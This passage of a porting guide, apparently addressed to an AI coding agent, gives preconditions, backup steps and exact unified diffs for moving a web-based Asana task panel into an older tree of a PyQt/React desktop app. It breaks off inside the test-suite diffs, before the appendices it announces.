# PORT — Asana-Mirror Web Task Panel (WS-D-WEB) → Mac box
# SELF-CONTAINED EDITION — no git, no network, no Node required

**Everything needed is IN THIS DOCUMENT**: full contents of every new
file (Appendix A), the generated web bundle (Appendix B), a checksum
manifest to prove your extraction is byte-perfect (Appendix C), and
exact surgical diffs for the shared files (§3). Canonical source:
`origin/enablement-content-tabs` @ `0499e52` (2026-08-10) — but you do
not need access to it.
This guide ports the four commits `3946311 → 694e766 → 65ebb29 → 0499e52` as ONE
cumulative change. It is written for a Sonnet-class implementer working on the
Mac tree, which is OLDER than this branch and must NEVER be merged, pulled, or
bulk-overwritten — new files land whole; shared files get the exact surgical
hunks below and nothing else.

## 0. Execution contract (read before touching anything)

1. **Run NO git commands that modify the tree — no merge, no pull, no
   checkout, no reset.** This document requires none. New files are
   written from Appendix A; shared files are edited ONLY via the exact
   diffs in §3. Never copy a directory over an existing one.
2. **Apply the surgical diffs in §3 hunk by hunk, in the order given.** Every
   hunk's context lines must match the file on this box EXACTLY (whitespace
   included). If a context line does not match, **STOP that file, apply
   nothing further to it, and report the mismatched hunk** — do not adapt,
   do not guess, do not "fix while you're here".
3. **Do not reformat, rename, reorder, or improve anything.** Comment styles,
   odd-looking guards, string-held function names — all deliberate.
4. Run the verification step at the end of each phase before starting the
   next. A failed verification stops the port.
5. If a §1 precondition fails, STOP the whole port and report — the Mac tree
   is missing an earlier port and this guide's anchors will not exist.

### The five laws (locked decisions — violating any of these reintroduces a
### bug that was found and fixed the hard way; QTBUG refs in the code comments)

- **L1** Every connection/timer on a QWebChannel-registered bridge is created
  in `__init__`, BEFORE registration. Never `QTimer.singleShot(ms, bridge_method)`.
- **L2** The task WebHost is NEVER reparented after it enters the drilldown's
  stack (`show_persistent_widget` adds it once; close only hides).
- **L3** NO QGraphicsEffect on any ancestor of the web view, and NO geometry
  animation of an ancestor while it is current (the drilldown disables its
  drop shadow and skips the slide in web mode — that asymmetry is the fix,
  not an oversight).
- **L4** Every SPA surface owns its scrolling (`.app.tk-app` double-class
  override) — the global `.app` shell is a fixed-height flex column.
- **L5** `task_web.py`/`task_bridge.py`/`task_vm.py`/`task_host.py` reference
  NO Asana write verb as an identifier — lane names live in `_LANES` as
  strings. An AST fence test enforces this; do not "clean it up".

## 1. Preconditions — verify ALL, else STOP

The Mac tree must already contain the WS-D native-panel state (the
`3cc7b10`/`df973a6` port). Check:

```bash
# each file must exist:
ls src/ui/pages/enablement/task_detail.py src/ui/web/web_host.py \
   src/ui/web/chat_bridge.py src/data/asana_extras.py \
   src/data/asana_writeback.py migrations/056_subtask_promotion.sql \
   web/src/lib/bridge.js web/src/zendesk/ZendeskApp.jsx

# each symbol must exist:
grep -n "_TASK_FIELDS" src/data/asana_client.py
grep -n "def toggle_subtask" src/data/enablement_tasks.py
grep -n "def update_task" src/data/asana_client.py
grep -n "def show_widget" src/ui/widgets/drilldown_panel.py
grep -n "_run_task_writeback" src/ui/pages/enablement/page.py
grep -n "refresh_requested" src/ui/pages/enablement/task_detail.py

# baseline tests must be green (kill zombies first on this box as usual):
python -m pytest tests/test_task_detail_panel.py tests/test_asana_monitor.py -q
# expected: 23 passed
npm --prefix web run test
# expected: 257 passed (pre-port count on this box)
```

If the vitest count differs slightly because this box carries a different
web-test baseline, note the number — the post-port expectation in §5 is
"baseline + 96".

Also back up every shared file this port edits, before touching anything:

```bash
mkdir -p .port_backup_2026_08_10
for f in src/data/asana_client.py src/data/asana_extras.py src/data/asana_writeback.py src/ui/pages/enablement/task_detail.py src/ui/web/web_flags.py src/ui/widgets/drilldown_panel.py src/ui/pages/enablement/page.py web/src/App.jsx tests/test_web_guardrails.py tests/test_task_detail_panel.py tests/test_help_claims_plan.py; do
  mkdir -p ".port_backup_2026_08_10/$(dirname $f)"
  cp "$f" ".port_backup_2026_08_10/$f"
done
ls -R .port_backup_2026_08_10 | head -20   # confirm 11 files backed up
```

## 2. Create the new files (contents are ALL in Appendix A)

None of the paths below exist on this box yet — creating them cannot
overwrite anything. For each of the 22 entries in **Appendix A**:

1. Create the file at the exact repo-relative path shown (make parent
   directories as needed: `web/src/task/` is new).
2. Write the fenced content **verbatim** — UTF-8, LF line endings, preserve
   the trailing newline, change nothing (not even whitespace).
3. After ALL files are written, run the **Appendix C** checksum verifier.
   Every file must print OK. A mismatch means your extraction dropped or
   altered bytes: re-extract that one file from Appendix A — never
   hand-patch toward the checksum.

Then write the generated web bundle `src/ui/web/dist/index.html` from
**Appendix B** (gzip+base64 with a decode command — no Node needed). If this
box has a working Node toolchain you may instead rebuild it AFTER §3-C with
`npm --prefix web run build`; the Appendix B route is preferred because it is
byte-verified.

## 3. Surgical edits — apply these exact diffs, file by file

Format: standard unified diffs against the pre-port state of each file.
`-` lines must exist and be removed; `+` lines are added; unprefixed context
must match exactly. STOP on any mismatch (contract rule 2).

### Phase A — data layer

#### A1 `src/data/asana_client.py` (3 hunks: widened _TASK_FIELDS; list_stories all subtypes + html; list_attachments host)

```diff
diff --git a/src/data/asana_client.py b/src/data/asana_client.py
index 374fa06..cc07a06 100644
--- a/src/data/asana_client.py
+++ b/src/data/asana_client.py
@@ -52,11 +52,17 @@ _OFFSET_REJECT_CODES = frozenset({400, 401})
 # indicator/mapping/brief logic reads, plus html_notes (rich body — stored raw,
 # never rendered as HTML), start_on, and the task assignee as a fallback.
 _TASK_FIELDS = (
-    "name,due_on,start_on,permalink_url,completed,modified_at,notes,html_notes,"
+    "name,due_on,start_on,permalink_url,completed,completed_at,modified_at,"
+    "notes,html_notes,"
     "num_subtasks,parent.gid,parent.name,"
     "assignee.name,assignee.gid,assignee.email,created_by.name,"
+    "completed_by.name,followers.name,"
     "custom_fields.gid,custom_fields.name,custom_fields.display_value,"
+    "custom_fields.resource_subtype,"
     "custom_fields.enum_value.gid,custom_fields.enum_value.name,"
+    "custom_fields.enum_value.color,"
+    "custom_fields.multi_enum_values.gid,custom_fields.multi_enum_values.name,"
+    "custom_fields.multi_enum_values.color,"
     "custom_fields.people_value.gid,custom_fields.people_value.name,"
     "custom_fields.number_value,custom_fields.text_value,"
     "custom_fields.date_value.date"
@@ -423,23 +429,28 @@ class AsanaClient:
         }
 
     def list_stories(self, task_gid: str, *, max_pages: int = 5) -> list[dict]:
-        """A task's comment stories (newest last) — ``GET /tasks/{gid}/stories``.
+        """A task's stories (newest last) — ``GET /tasks/{gid}/stories``.
 
-        Filters to ``resource_subtype == "comment_added"`` (system stories like
-        "assigned to X" are noise for the extras panel). Pages via
+        Returns ALL subtypes (WS-D-WEB: the web mirror renders system and
+        rule/automation rows, not just comments) with the subtype + rich
+        ``html_text`` carried ADDITIVELY. Consumers that want the old
+        comments-only view filter on ``subtype == "comment_added"``, treating
+        a missing subtype (pre-058 stored rows) as a comment. Pages via
         ``next_page.offset`` up to ``max_pages`` like :meth:`list_workspace_users`.
         """
         params: dict = {
-            "opt_fields": "text,created_at,created_by.name,resource_subtype",
+            "opt_fields": "text,html_text,created_at,created_by.name,"
+                          "resource_subtype",
         }
         stories = self._paginate(f"/tasks/{task_gid}/stories", params,
                                  max_pages=max_pages)
         return [
             {"gid": s.get("gid", ""), "text": s.get("text", ""),
              "created_at": s.get("created_at", ""),
-             "author": (s.get("created_by") or {}).get("name", "")}
+             "author": (s.get("created_by") or {}).get("name", ""),
+             "subtype": s.get("resource_subtype", ""),
+             "html": s.get("html_text", "")}
             for s in stories
-            if s.get("resource_subtype") == "comment_added"
         ]
 
     def list_subtasks(self, task_gid: str) -> list[dict]:
@@ -472,9 +483,10 @@ class AsanaClient:
         ``get_attachment`` for a single attachment's download URL + host.
         """
         data = self._paginate(f"/tasks/{task_gid}/attachments",
-                              {"opt_fields": "name,resource_subtype"})
+                              {"opt_fields": "name,resource_subtype,host"})
         return [{"gid": a["gid"], "name": a.get("name", ""),
-                 "subtype": a.get("resource_subtype", "")} for a in data]
+                 "subtype": a.get("resource_subtype", ""),
+                 "host": a.get("host", "")} for a in data]
 
     def get_attachment(self, attachment_gid: str) -> dict:
         """Fetch one attachment's download URL + host.
```

#### A2 `src/data/asana_extras.py` (upsert gains task_fields_json; _task_fields projection helper; set_html_notes; get_extras decodes task_fields)

```diff
diff --git a/src/data/asana_extras.py b/src/data/asana_extras.py
index d2a649d..a3936d3 100644
--- a/src/data/asana_extras.py
+++ b/src/data/asana_extras.py
@@ -60,13 +60,14 @@ def upsert_extras(conn, task_id: str, task_payload: dict, *, client=None) -> Non
         conn.execute(
             """INSERT INTO asana_task_extras
                (task_id, html_notes, custom_fields_json, attachments_json,
-                stories_json, for_modified_at, fetched_at)
-               VALUES (?, ?, ?, ?, ?, ?, ?)
+                stories_json, task_fields_json, for_modified_at, fetched_at)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(task_id) DO UPDATE SET
                  html_notes=excluded.html_notes,
                  custom_fields_json=excluded.custom_fields_json,
                  attachments_json=excluded.attachments_json,
                  stories_json=excluded.stories_json,
+                 task_fields_json=excluded.task_fields_json,
                  for_modified_at=excluded.for_modified_at,
                  fetched_at=excluded.fetched_at""",
             (task_id,
@@ -74,6 +75,7 @@ def upsert_extras(conn, task_id: str, task_payload: dict, *, client=None) -> Non
              json.dumps(task_payload.get("custom_fields") or []),
              json.dumps(attachments),
              json.dumps(stories),
+             json.dumps(_task_fields(task_payload)),
              task_payload.get("modified_at") or "",
              _now()),
         )
@@ -86,6 +88,46 @@ def upsert_extras(conn, task_id: str, task_payload: dict, *, client=None) -> Non
         raise
 
 
+def _task_fields(task_payload: dict) -> dict:
+    """Task-level extras projection (mig 058) — the fields the web mirror
+    renders that enablement_tasks deliberately never stored: the due RANGE
+    start, the collaborator stack, and the completion stamp."""
+    out = {}
+    for key in ("start_on", "due_on", "completed", "completed_at",
+                "num_subtasks", "permalink_url"):
+        val = task_payload.get(key)
+        if val is not None:
+            out[key] = val
+    followers = [
+        {"name": (f or {}).get("name", "")}
+        for f in (task_payload.get("followers") or [])
+        if (f or {}).get("name")
+    ]
+    if followers:
+        out["followers"] = followers
+    completed_by = (task_payload.get("completed_by") or {}).get("name", "")
+    if completed_by:
+        out["completed_by"] = completed_by
+    return out
+
+
+def set_html_notes(conn, task_id: str, html: str) -> None:
+    """Overwrite the stored rich body after a successful description PUT —
+    the reopen re-reads extras, so without this the panel would show the
+    pre-edit body until the next remote refresh."""
+    try:
+        conn.execute(
+            "UPDATE asana_task_extras SET html_notes = ? WHERE task_id = ?",
+            (html or "", str(task_id)))
+        conn.commit()
+    except Exception:
+        try:
+            conn.rollback()
+        except Exception:  # noqa: BLE001
+            pass
+        raise
+
+
 def get_extras(conn, task_id: str) -> dict | None:
     """Extras for one task with JSON fields decoded, or None."""
     row = conn.execute(
@@ -98,6 +140,11 @@ def get_extras(conn, task_id: str) -> dict | None:
             out[key[:-5]] = json.loads(out.get(key) or "[]")
         except (ValueError, TypeError):
             out[key[:-5]] = []
+    try:
+        fields = json.loads(out.get("task_fields_json") or "{}")
+        out["task_fields"] = fields if isinstance(fields, dict) else {}
+    except (ValueError, TypeError):
+        out["task_fields"] = {}
     return out
 
 
```

#### A3 `src/data/asana_writeback.py` (two NEW lanes: set_subtask_completed_in_asana, update_description_in_asana — pure insertions)

```diff
diff --git a/src/data/asana_writeback.py b/src/data/asana_writeback.py
index 595f01c..3e9ea1e 100644
--- a/src/data/asana_writeback.py
+++ b/src/data/asana_writeback.py
@@ -153,6 +153,64 @@ def create_subtask_in_asana(conn, task_id: str, text: str, *,
     return {"ok": True, "subtask_id": sid, "synced": True, "asana_subtask_gid": gid}
 
 
+def set_subtask_completed_in_asana(conn, task_id: str, subtask_gid: str,
+                                   done: bool, *, client=None) -> dict:
+    """Complete/reopen ONE subtask locally AND in Asana (WS-D-WEB mirror verb).
+
+    ``task_id`` is the PARENT's local id (the caller validated the subtask
+    belongs to it); ``subtask_gid`` is the Asana subtask GID, which is itself
+    a task for the PUT. Local-first like the sibling verbs: the checklist row
+    (enablement_subtasks) and any PROMOTED row (mig 056 — an enablement_tasks
+    row whose source_ref is this gid) both flip before the API call, and an
+    API failure REVERTS both — a diverged done-state misleads exactly like a
+    parent's would. No CAS: checklist rows carry no remote_modified_at
+    anchor; the poll's subtask re-read self-heals the sub-second race."""
+    from src.data import enablement_tasks as et
+    gid = str(subtask_gid or "").strip()
+    if not gid:
+        return {"ok": False, "error": "subtask_gid_required"}
+    row = conn.execute(
+        "SELECT subtask_id FROM enablement_subtasks "
+        "WHERE task_id = ? AND asana_subtask_gid = ?",
+        (str(task_id), gid),
+    ).fetchone()
+    promoted = conn.execute(
+        "SELECT task_id, status FROM enablement_tasks "
+        "WHERE source_ref = ? AND parent_task_ref IS NOT NULL",
+        (gid,),
+    ).fetchone()
+    if row is None and promoted is None:
+        return {"ok": False, "error": "subtask_not_found"}
+
+    new_status = "done" if done else "open"
+
+    def _flip(to_done: bool, status: str):
+        if row is not None:
+            et.toggle_subtask(conn, row[0], to_done)
+        if promoted is not None:
+            et.update_task(conn, promoted[0], status=status)
+
+    _flip(bool(done), new_status)
+    c = _client(client)
+    if c is None:
+        return {"ok": True, "synced": False, "done": bool(done),
+                "note": "updated locally — Asana not configured"}
+    if promoted is not None:
+        _set_inflight(promoted[0], new_status)
+    try:
+        try:
+            c.update_task(gid, completed=bool(done))
+        except Exception as exc:  # noqa: BLE001 — revert, the flip would mislead
+            prev_status = (promoted[1] if promoted is not None else "open") or "open"
+            _flip(not bool(done), prev_status)
+            logger.warning("Asana subtask write-back failed: %s", exc)
+            return {"ok": False, "error": str(exc), "reverted": True}
+        return {"ok": True, "synced": True, "done": bool(done)}
+    finally:
+        if promoted is not None:
+            _clear_inflight(promoted[0])
+
+
 def post_comment_to_asana(conn, task_id: str, text: str, *, client=None) -> dict:
     """Post a comment on the linked Asana task (no local mirror — Asana owns it)."""
     text = (text or "").strip()
@@ -203,6 +261,48 @@ def update_due_in_asana(conn, task_id: str, due_on: str | None, *, client=None)
     return {"ok": True, "synced": True, "due_on": due_on}
 
 
+def update_description_in_asana(conn, task_id: str, markdown: str, *,
+                                client=None) -> dict:
+    """Replace the task description locally AND in Asana (WS-D-WEB mirror verb).
+
+    REMOTE-FIRST, unlike the optimistic complete-flip: a description is
+    content, and a local edit that silently failed to reach Asana would
+    masquerade as saved. Order: CAS precheck (an overwrite can clobber a
+    teammate — stale anchor blocks) → serialize markdown to Asana's
+    html_notes dialect → PUT → only then mirror locally (extras html_notes +
+    the plain description column) and restamp. Unlinked/unconfigured tasks
+    degrade to the local mirror only, like the sibling verbs.
+    """
+    from src.data import asana_rich
+    from src.data import asana_extras
+    from src.data import enablement_tasks as et
+    md = str(markdown if markdown is not None else "")
+    tid = str(task_id)
+    gid = _asana_task_gid(conn, tid)
+    if not gid:
+        et.update_task(conn, tid, description=md)
+        return {"ok": True, "synced": False,
+                "note": "updated locally — this task is not linked to Asana"}
+    c = _client(client)
+    if c is None:
+        et.update_task(conn, tid, description=md)
+        return {"ok": True, "synced": False,
+                "note": "updated locally — Asana not configured"}
+    conflict = _cas_precheck(conn, tid, gid, c)
+    if conflict:
+        return conflict
+    html = asana_rich.to_asana_html(md)
+    try:
+        res = c.update_task(gid, html_notes=html)
+    except Exception as exc:  # noqa: BLE001 — nothing local changed yet
+        logger.warning("Asana description write-back failed: %s", exc)
+        return {"ok": False, "error": str(exc)}
+    asana_extras.set_html_notes(conn, tid, html)
+    et.update_task(conn, tid, description=md)
+    _restamp(conn, tid, res)
+    return {"ok": True, "synced": True}
+
+
 def set_completed_in_asana(conn, task_id: str, done: bool, *, client=None) -> dict:
     """Complete/reopen a task locally AND in Asana (WS1-M5 panel verb).
 
```

#### A4 `src/ui/pages/enablement/task_detail.py` (native panel: comments-only story filter — post-058 stories_json carries all subtypes)

```diff
diff --git a/src/ui/pages/enablement/task_detail.py b/src/ui/pages/enablement/task_detail.py
index de15225..b995036 100644
--- a/src/ui/pages/enablement/task_detail.py
+++ b/src/ui/pages/enablement/task_detail.py
@@ -361,7 +361,11 @@ class TaskDetailPanel(QWidget):
             v.addWidget(self._att_error)
 
         # ── Comments (card rows: author bold · local time · pre-wrap body) ──
-        stories = extras.get("stories") or []
+        # Post-058 stories_json carries ALL subtypes for the web mirror; this
+        # panel keeps its comments-only view. Missing subtype = pre-058 row,
+        # which was comments-only by construction.
+        stories = [s for s in (extras.get("stories") or [])
+                   if (s.get("subtype") or "comment_added") == "comment_added"]
         if stories:
             cards = QWidget()
             cards.setStyleSheet("background:transparent;")
```

#### A5 `src/ui/web/web_flags.py` (task_web_enabled — default ON, hand-edit kill switch)

```diff
diff --git a/src/ui/web/web_flags.py b/src/ui/web/web_flags.py
index 9316f55..f3986b1 100644
--- a/src/ui/web/web_flags.py
+++ b/src/ui/web/web_flags.py
@@ -63,6 +63,31 @@ def zendesk_web_enabled() -> bool:
     return web_tabs_mode() in ("zendesk", "all")
 
 
+def task_web_enabled() -> bool:
+    """True when the task drilldown should render the SPA ``#/task`` route.
+
+    Deliberately an OPT-OUT (default on) — the owner call at WS-D-WEB M2 was
+    "default-on + construction fallback; avoid another writer-less flag".
+    The native ``TaskDetailPanel`` remains the permanent fallback on ANY
+    web-triple construction failure, so the flag exists only as a hand-edit
+    kill switch (``enablement.task_web: false``); a settings error keeps the
+    default rather than killing the surface.
+    """
+    try:
+        from src.data.settings_manager import get_section
+        section = get_section("enablement", {}) or {}
+    except Exception:  # noqa: BLE001 — an unreadable kill switch is not a kill
+        return True
+    raw = section.get("task_web", True)
+    if isinstance(raw, bool):
+        return raw
+    if isinstance(raw, (int, float)) and not isinstance(raw, bool):
+        return int(raw) == 1
+    if isinstance(raw, str):
+        return raw.strip().lower() not in ("off", "false", "no", "0")
+    return True
+
+
 def web_home_enabled() -> bool:
     """True when Home should render the SPA ``#/home`` route.
 
```

**Phase A verification** (migration 058 self-applies on next app start; the
test fixtures apply it via the migrated schema):

```bash
python -m pytest tests/test_asana_rich.py tests/test_asana_monitor.py -q
# expected: 15 passed  (8 asana_rich + 7 monitor)
python - <<'EOF'
from src.data.asana_rich import to_asana_html
assert to_asana_html("**b**") == "<body><strong>b</strong></body>"
print("asana_rich OK")
EOF
```

### Phase B — hosting (drilldown + page)

#### B1 `src/ui/widgets/drilldown_panel.py` (5 hunks: _set_shadow_enabled; show_persistent_widget; _open_immediate; web-mode instant close; shadow restore on close/show_widget)

```diff
diff --git a/src/ui/widgets/drilldown_panel.py b/src/ui/widgets/drilldown_panel.py
index f6a2950..937c2b7 100644
--- a/src/ui/widgets/drilldown_panel.py
+++ b/src/ui/widgets/drilldown_panel.py
@@ -323,6 +323,17 @@ class DrilldownPanel(QFrame):
         shadow.setColor(QColor(0, 0, 0, 30))
         self.setGraphicsEffect(shadow)
 
+    def _set_shadow_enabled(self, on: bool):
+        """A QGraphicsEffect on an ancestor of a QWebEngineView is an
+        unsupported combination (QTBUG-47848 class): the subtree renders
+        through an offscreen pixmap path the GL-backed Chromium delegate
+        can't join — stale-composited fragments, dead input in the view,
+        and stalled repaints of sibling widgets. Web mode turns the shadow
+        OFF; every native mode restores it."""
+        eff = self.graphicsEffect()
+        if eff is not None:
+            eff.setEnabled(on)
+
     # ═══════════════════════════════════════════
     #  PUBLIC API
     # ═══════════════════════════════════════════
@@ -433,6 +444,7 @@ class DrilldownPanel(QFrame):
         self._mode = "widget"
         self._level = 2
         self._saved_title = title
+        self._set_shadow_enabled(True)   # native content tolerates the shadow
 
         # Detach any previously hosted widget
         self._detach_hosted_widget()
@@ -460,6 +472,51 @@ class DrilldownPanel(QFrame):
         self._thread_frame.show()
         self._slide_open()
 
+    def show_persistent_widget(self, title: str, subtitle: str, widget: QWidget):
+        """Widget mode for a PERSISTENT host (the WS-D-WEB task WebHost).
+
+        The widget is added to the detail stack ONCE and never detached —
+        reparenting a QWebEngineView (what show_widget's detach cycle does)
+        tears down its Chromium compositor and every reopen after the first
+        renders a white view. Close only hides the panel; the widget stays
+        parented to the stack for the life of the session. Appended after
+        index 1 so the native scroll-area contract (widget(1)) never shifts.
+        """
+        if getattr(self, "_persistent_widget", None) is not widget:
+            self._persistent_index = self._detail_stack.addWidget(widget)
+            self._persistent_widget = widget
+        self._mode = "widget"
+        self._level = 2
+        self._saved_title = title
+
+        # A native panel may have been hosted before (web→native fallback
+        # alternation); clear it from index 1 without touching our page.
+        self._detach_hosted_widget()
+        widget.show()
+        self._detail_stack.setCurrentIndex(self._persistent_index)
+
+        self._panel_title.setText(title)
+        self._thread_header.setText(title)
+        self._thread_meta.setText(subtitle)
+        self._list_frame.hide()
+        self._back_btn.hide()
+        self._prev_btn.hide()
+        self._next_btn.hide()
+        self._nav_label.hide()
+        self._load_main_btn.hide()
+        self._thread_frame.show()
+        # Web mode: no ancestor effect, no geometry animation (both break
+        # the Chromium delegate — see _set_shadow_enabled/_open_immediate).
+        self._set_shadow_enabled(False)
+        self._open_immediate()
+        # Chromium's delegate caches widget geometry across hide/show; a
+        # down-up resize forces a fresh geometry push so input mapping
+        # matches the composited texture.
+        size = widget.size()
+        if size.height() > 1:
+            widget.resize(size.width(), size.height() - 1)
+            widget.resize(size)
+
     def show_pattern(self, pattern_data: dict):
         """Open the panel showing sub-pattern stats, ticket list, and deep dive.
 
@@ -1023,6 +1080,22 @@ class DrilldownPanel(QFrame):
     #  ANIMATION
     # ═══════════════════════════════════════════
 
+    def _open_immediate(self):
+        """Open with NO geometry animation — the persistent-web-mode path.
+        Animating an ancestor of a live QWebEngineView leaves the Chromium
+        delegate's input-coordinate mapping stale (QTBUG-68440 class): the
+        page renders correctly but wheel/clicks land dead. The panel
+        appears at its final geometry instead."""
+        if not self.parentWidget():
+            return
+        if self._anim is not None:
+            self._anim.stop()
+            self._anim = None
+        self._position_panel()
+        self.show()
+        self.raise_()
+        self.panel_opened.emit()
+
     def _slide_open(self):
         if self.isVisible() and self._anim is None:
             # Already visible, no animation needed — just ensure position
@@ -1059,6 +1132,12 @@ class DrilldownPanel(QFrame):
         self.panel_opened.emit()
 
     def _slide_closed(self):
+        # Web mode closes without the geometry animation too — the live
+        # QWebEngineView must never be geometry-animated (see _open_immediate).
+        if (getattr(self, "_persistent_widget", None) is not None
+                and self._detail_stack.currentWidget() is self._persistent_widget):
+            self._on_close_finished()
+            return
         parent = self.parentWidget()
         if not parent:
             self.hide()
@@ -1081,6 +1160,7 @@ class DrilldownPanel(QFrame):
     def _on_close_finished(self):
         self._anim = None
         self._level = 0
+        self._set_shadow_enabled(True)   # restore for the native modes
         self._detach_hosted_widget()
         self._mode = "tickets"
         self._report_detail_cb = None
```

#### B2 `src/ui/pages/enablement/page.py` (6 hunks: web branch in _show_task_detail + focus; _task_web_available/_get_task_web_host + outcome connect; _rich_subtasks gid; _open_subtask_from_web; _run_task_refresh restamps the CAS anchor)

```diff
diff --git a/src/ui/pages/enablement/page.py b/src/ui/pages/enablement/page.py
index bf1c4b8..e9d03e0 100644
--- a/src/ui/pages/enablement/page.py
+++ b/src/ui/pages/enablement/page.py
@@ -3513,6 +3513,33 @@ class EnablementPage(QWidget):
                         pass
             except Exception:  # noqa: BLE001 — extras/brief are enrichment only
                 pass
+        # WS-D-WEB: the Asana-mirror web panel renders when available; ANY
+        # failure — flag off, WebEngine broken, push error — keeps the native
+        # panel as the permanent fallback.
+        if self._task_web_available():
+            ctrl, host = self._get_task_web_host()
+            if ctrl is not None and host is not None:
+                try:
+                    ctrl.show_task(task)
+                    self._open_task_title = task.get("title")
+                    self._open_task_id = task.get("task_id")
+                    if hasattr(host, "on_page_shown"):
+                        host.on_page_shown()   # reload if the renderer died
+                    self._drilldown.show_persistent_widget(
+                        "Task", task.get("source", "").capitalize(), host)
+                    # Keyboard needs the view (its focusProxy) to hold Qt
+                    # focus — a panel shown from a click elsewhere never
+                    # receives it on its own (recon #7.3).
+                    try:
+                        host.view.setFocus()
+                    except Exception:  # noqa: BLE001
+                        pass
+                    self._set_status(f"Opened “{task.get('title', 'task')}”.")
+                    return
+                except Exception:  # noqa: BLE001 — web push failed → native
+                    self._task_web_failed = True
+                    logger.warning("web task panel failed — native fallback",
+                                   exc_info=True)
         panel = TaskDetailPanel(task)
         panel.open_in_workbench.connect(lambda: self.tabs.setCurrentWidget(self._workbench_tab))
         panel.open_source.connect(self._open_source_url)
@@ -3538,6 +3565,60 @@ class EnablementPage(QWidget):
         self._drilldown.show_widget("Task", task.get("source", "").capitalize(), panel)
         self._set_status(f"Opened “{task.get('title', 'task')}”.")
 
+    def _task_web_available(self) -> bool:
+        if getattr(self, "_task_web_failed", False):
+            return False
+        try:
+            from src.ui.web.web_flags import task_web_enabled
+            return task_web_enabled()
+        except Exception:  # noqa: BLE001 — flag trouble → native panel
+            return False
+
+    def _get_task_web_host(self):
+        """ONE persistent WebHost for the task drilldown (the M1/16GB render
+        budget): built lazily on first task open, reused across every open.
+        Any construction failure marks the session native-only."""
+        if getattr(self, "_task_web_host", None) is not None:
+            return self._task_web_ctrl, self._task_web_host
+        try:
+            from src.ui.web.task_host import build_task_web_triple
+            ctrl, bridge, host = build_task_web_triple(
+                write_fn=self._run_task_writeback,
+                refresh_fn=self._run_task_refresh,
+                open_url_fn=self._open_source_url,
+                open_subtask_fn=self._open_subtask_from_web)
+            ctrl.status_text.connect(self._set_status)
+            # Writeback OUTCOMES (incl. CAS conflicts) must be visible from
+            # inside the panel, not only on the app status line.
+            self.task_action_done.connect(ctrl.notify_action_outcome)
+            # GC guards — WebHost parents the bridge; ctrl/host live here.
+            self._task_web_ctrl, self._task_web_bridge = ctrl, bridge
+            self._task_web_host = host
+            return ctrl, host
+        except Exception:  # noqa: BLE001 — WebEngine absent/broken → native
+            self._task_web_ctrl = self._task_web_bridge = None
+            self._task_web_host = None
+            self._task_web_failed = True
+            logger.warning("web task panel unavailable — native fallback",
+                           exc_info=True)
+            return None, None
+
+    def _open_subtask_from_web(self, parent_task_id: str, subtask_gid: str):
+        """Subtask name clicked in the web panel — subtasks ARE tasks. A
+        promoted row (mig 056: an enablement_tasks row whose source_ref is
+        this gid) opens in the same panel; an unsynced checklist row opens
+        in Asana itself (permalink pattern /0/0/<gid>/f, scheme-validated
+        by _open_source_url)."""
+        gid = (subtask_gid or "").strip()
+        if not gid:
+            return
+        task = next((t for t in getattr(self, "_all_tasks", [])
+                     if t.get("source_ref") == gid), None)
+        if task is not None:
+            self._show_task_detail(task)
+        else:
+            self._open_source_url(f"https://app.asana.com/0/0/{gid}/f")
+
     def _board_display_names(self, conn, source_ids) -> list[str]:
         """Board display names for the panel's meta line (WS-D2), resolved
         from the task's task_board_links source ids. Read straight from the
@@ -3576,6 +3657,7 @@ class EnablementPage(QWidget):
             out.append({
                 "text": s.get("text", ""),
                 "done": bool(s.get("done")),
+                "gid": (s.get("asana_subtask_gid") or "").strip(),
                 "assignee": ((p["assignee"] if p is not None else "") or "").strip(),
                 "due": (((p["due_date"] if p is not None else "") or "")[:10]),
             })
@@ -3601,6 +3683,15 @@ class EnablementPage(QWidget):
                 client = AsanaClient.from_store()
                 payload = client.get_task(gid, opt_fields=_TASK_FIELDS)
                 asana_extras.upsert_extras(conn, task_id, payload, client=client)
+                # The explicit refresh restamps the CAS anchor: promoted
+                # subtask rows drift (subtask-local changes emit no board
+                # event, so no poll pass restamps them) and "refresh, then
+                # retry" is the documented conflict remedy — the operator
+                # has now been shown the fresh state this anchor reflects.
+                if payload.get("modified_at"):
+                    from src.data import enablement_tasks as _et
+                    _et.update_task(conn, task_id,
+                                    remote_modified_at=payload["modified_at"])
                 res = {"ok": True, "refreshed": True}
             except Exception as exc:  # noqa: BLE001
                 res = {"ok": False, "error": str(exc), "refreshed": True}
```

**Phase B verification:**

```bash
python -m pytest tests/test_task_web_controller.py tests/test_task_bridge.py -q
# expected: 90 passed  (one test may SKIP when run after a QCoreApplication
# group — "a non-widget QCoreApplication owns this process" is fine)
```

### Phase C — web surface

#### C1 `web/src/App.jsx` (3 one-line additions: the #/task route)

```diff
diff --git a/web/src/App.jsx b/web/src/App.jsx
index 58e456f..4d99226 100644
--- a/web/src/App.jsx
+++ b/web/src/App.jsx
@@ -4,6 +4,7 @@ import CalendarApp from "./calendar/CalendarApp.jsx";
 import WorkbenchApp from "./workbench/WorkbenchApp.jsx";
 import HomeApp from "./home/HomeApp.jsx";
 import ZendeskApp from "./zendesk/ZendeskApp.jsx";
+import TaskApp from "./task/TaskApp.jsx";
 
 // Hash router for the single-file SPA. Each WebHost loads the same
 // dist/index.html with its own fragment: no hash (the Agent page, pre-router
@@ -15,6 +16,7 @@ function routeFromHash() {
   if (h.startsWith("workbench")) return "workbench";
   if (h.startsWith("home")) return "home";
   if (h.startsWith("zendesk")) return "zendesk";
+  if (h.startsWith("task")) return "task";
   return "chat";
 }
 
@@ -32,5 +34,6 @@ export default function App() {
   if (route === "workbench") return <WorkbenchApp />;
   if (route === "home") return <HomeApp />;
   if (route === "zendesk") return <ZendeskApp />;
+  if (route === "task") return <TaskApp />;
   return <ChatApp />;
 }
```

**Phase C verification:**

```bash
npm --prefix web run test
# expected: pre-port baseline + 96 (on the source box: 353 passed)
# dist: either already checked out in §2 (done) or rebuild now:
#   npm --prefix web run build
```

### Phase D — test-suite surgery

#### D1 `tests/test_web_guardrails.py` (register task_bridge in GATED_SLOT_TESTS — without this the guardrail FAILS on the new bridge module)

```diff
diff --git a/tests/test_web_guardrails.py b/tests/test_web_guardrails.py
index 8d05ffb..f465f36 100644
--- a/tests/test_web_guardrails.py
+++ b/tests/test_web_guardrails.py
@@ -100,6 +100,12 @@ GATED_SLOT_TESTS = {
     # closed), pull/import claim before the nested-event-loop pickers, and
     # the no-Zendesk-write guarantee is asserted structurally there.
     "src/ui/web/zendesk_bridge.py": "tests/test_zendesk_bridge.py",
